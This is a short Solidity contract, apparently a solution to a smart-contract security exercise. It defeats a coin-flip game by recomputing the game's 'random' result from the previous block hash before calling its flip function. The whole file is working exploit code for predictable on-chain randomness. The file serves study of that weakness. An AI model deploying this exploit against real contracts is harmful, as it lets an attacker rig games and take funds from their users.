// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./interfaces/ICoinFlip.sol";

contract AttackCoinFlip {
    constructor(address _coinFlipContract) public {
        coinFlipContract = _coinFlipContract;
    }

    address public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function magicFlip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(coinFlipContract).flip(side);
    }
}